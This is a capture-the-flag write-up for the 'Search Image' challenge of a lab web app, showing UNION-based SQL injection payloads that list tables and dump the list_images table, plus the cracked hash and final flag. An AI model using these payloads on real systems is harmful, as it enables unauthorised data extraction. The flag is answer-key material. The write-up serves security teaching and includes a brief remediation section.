# <span style="text-decoration: underline"> Search Image </span>

##### Tags : `SQL Injection`
##### Server ip : `192.168.1.17 `
____

# <span style="text-decoration: underline">problem</span>

When we visit the `SEARCH IMAGE` page from **Home page** we see a page where there is an input for **image number** and a `submit` btton. Like other input in this project this could be a way to do `sql injection` To test we could simply try the `'` character. When we set `'` as input character and siubmit, nothing happens. Let's try `1=0`. Yes!! We have aresult with all the image `name` and `urls`.

# <span style="text-decoration: underline">Solution</span>

## Get the table name of our default database
We have found out many database and table names in the [member](/member.md) challenge. Let's try to findout in which tables does this database (default) contains, from this input.

```sql
1 AND 1=0 UNION SELECT 1, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()) --
```

And we get the following result.

```sql
ID: 1 AND 1=0 UNION SELECT 1, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()) -- 
Title: list_images
Url : 1
```

We can see that there is a table called `list_images`. In the [member](/member.md) challenge. we have found out the names of the columns for this table

|No|Table|Column names|
|--|--|--|
|1| **db_default** | `id`, `username`, `password` |
|2| **users** | `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`,  |
|3| **guestbook** | `id_comment` , `comment`, `name` |
|4| **list_images** | `id`, `url`, `title`, `comment` |
|5| **vote_dbs** | `id_vote`, `nb_vote`, `subject`|

## View content of the database

Now that we know what we have in the table let's try to extract the data using the same technique from [member](/member.md) challenge. but using the `column` names for this `table`.

```sql
1 AND 1=2 UNION SELECT title, CONCAT(CHAR(124), id, CHAR(124), url, CHAR(124), title, CHAR(124), comment, CHAR(124)) AS name FROM list_images --
```

We get the following respons

|Id|Url|Title|Comment|
|--|--|--|--|
|1|https://www.nsa.org/img.jpg|Nsa|An image about the NSA !|
|2|https://www.42.fr/42.png|42 !|There is a number..|
|4|https://www.obama.org/obama.jpg|Obama|Yes we can !|
|5|borntosec.ddns.net/images.png|Hack me ?|If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46|
|6|https://www.h4x0r3.0rg/tr0ll.png|tr00l|Because why not ?|

## UnHash and Rehash

Much like the [member](/member.md) challenge, we also get a `md5` string that we have to transform it to **lowercase** and then hash it using `sha256`.

- The `md5` hash `1928e8083cf461a51303633093573c46` is of the word `albatroz`
- It is already all lowercase
- The sha256 sum of the word `albatroz` is `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

# How to avoid the problem

Contrary to the challenge [member](/member.md) challenge, they have removed the `error` messages of bad user inputs but did not do anything agains't correct `sql` query as input. Sql injection could be a dengerouis problem which could as fas as compromise the whole system. in our situation the programmer used the raw **user input** data inside the query which in turn let the user control what the quert string becomes and so the result is given. This kind of situation can be avoided easily by not using the user input directly in our string. 


# Flag

```text
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

?> Node : This is the same `flag` as the one we found during the [copytight](/copyright.md) challenge

# Resources

- [member challenge](/member.md)